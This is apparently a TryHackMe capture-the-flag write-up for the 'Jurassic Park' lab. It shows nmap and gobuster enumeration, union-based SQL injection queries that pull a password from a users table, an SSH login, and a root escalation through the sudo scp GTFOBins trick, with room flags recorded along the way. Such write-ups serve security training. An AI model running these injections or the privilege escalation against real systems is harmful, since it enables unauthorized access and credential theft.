JURRASIC PARK 


ENUMERATION


NAMP 


"""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/JURRASIC_PARK]
└─$ sudo nmap -p- -sC -sV -A  --min-rate 2500 $IP -oN nmap.txt 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-04 11:10 EST
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 28.99% done; ETC: 11:11 (0:00:22 remaining)
Warning: 10.10.212.104 giving up on port because retransmission cap hit (10).
Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 92.88% done; ETC: 11:11 (0:00:00 remaining)
Nmap scan report for 10.10.212.104
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f5:34:f2:27:38:7f:be:b8:e6:74:32:1d:aa:34:43:2f (RSA)
|   256 5f:8b:64:ac:50:eb:f3:fc:fc:1e:5f:42:8b:18:12:d0 (ECDSA)
|_  256 d0:91:7c:1a:f4:8d:fe:e2:dc:97:5c:d0:f0:1d:c6:d6 (ED25519)
80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Jarassic Park
|_http-server-header: Apache/2.4.18 (Ubuntu)
56107/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/4%OT=22%CT=1%CU=38054%PV=Y%DS=2%DC=T%G=Y%TM=62223A62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)SEQ(
OS:SP=104%GCD=1%ISR=108%TI=Z%TS=A)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=RD%TS=A)
OS:OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505
OS:ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
OS:ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   168.17 ms 10.11.0.1
2   166.31 ms 10.10.212.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.85 seconds






"""



GOBUSTER


"""





┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/JURRASIC_PARK]
└─$ gobuster dir -u http://10.10.212.104/ -w /usr/share/wordlists/dirb/big.txt  -t 80 --no-error 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.212.104/
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/04 11:11:50 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/assets               (Status: 301) [Size: 315] [--> http://10.10.212.104/assets/]
/delete               (Status: 200) [Size: 65]                                    
/robots.txt           (Status: 200) [Size: 17]                                    
/server-status        (Status: 403) [Size: 301]                                   
                                                                                  
===============================================================
2022/03/04 11:13:12 Finished
===============================================================











"""


THEir is a sqli vul 


DATBASE NAME =  park 

database version = 5.7.25-0ubuntu0.16.04.2


COLUMNS ARE 5 

1 = useless
2 = usefull
3=  useless
4=  usefull
5=  usefull


lets return table names 

union select 1,2,3,concat(table_name),5 from information_schema.tables where table_schema= database()


table name = users,items

lets get column name 

union select 1,2,3,concat(column_name),5 from information_schema.columns where table_schema= database()

id,package,price,information,sold,id,username,password


LETSMAKE A QUERY TO EXTRACTDATA 

union select 1,2,3,4,password from users 


password = ih8dinos


so we have a password not username 


REMEMBER

"""


This medium-hard task will require you to enumerate the web application, get credentials to the server and find 5 flags hidden around the file system.
 Oh, Dennis Nedry has helped us to secure the app too...

You're also going to want to turn up your devices volume (firefox is recommended). So, deploy the VM and get hacking..



"""


we can assume username = dennis 

password is = ih8dinos


LETS TRY SSH


"""

LOGGED IN 


                                                                                                      
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/JURRASIC_PARK]
└─$ ssh dennis@$IP                                          
The authenticity of host '10.10.212.104 (10.10.212.104)' can't be established.
ED25519 key fingerprint is SHA256:Xn8agjN5nPRphoIfaXnyTgVGYF/je1qQQ8fW+T+2hg8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.212.104' (ED25519) to the list of known hosts.
dennis@10.10.212.104's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-1072-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  Get cloud support with Ubuntu Advantage Cloud Guest:
    http://www.ubuntu.com/business/services/cloud

62 packages can be updated.
45 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dennis@ip-10-10-212-104:~$ 
dennis@ip-10-10-212-104:~$ 
dennis@ip-10-10-212-104:~$ ls
flag1.txt  test.sh
dennis@ip-10-10-212-104:~$ 

b89f2d69c56b9981ac92dd267f

dennis@ip-10-10-212-104:~$ cat .bash_history
Flag3:b4973bbc9053807856ec815db25fb3f1

dennis@ip-10-10-212-104:/boot/grub/fonts$ cat flagTwo.txt 
96ccd6b429be8c9a4b501c7a0b117b0a
dennis@ip-10-10-212-104:/boot/grub/fonts$ 
 
"""



PRIV ESC THROUGH SCP AND GTFO BINS 



"""


dennis@ip-10-10-212-104:~$ TF=$(mktemp)
dennis@ip-10-10-212-104:~$ echo 'sh 0<&2 1>&2' > $TF
dennis@ip-10-10-212-104:~$ chmod +x "$TF"
dennis@ip-10-10-212-104:~$ sudo scp -S $TF x y:
# 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
flag5.txt  snap
# cat flag5.txt 
2a7074e491fcacc7eeba97808dc5e2ec
# 




"""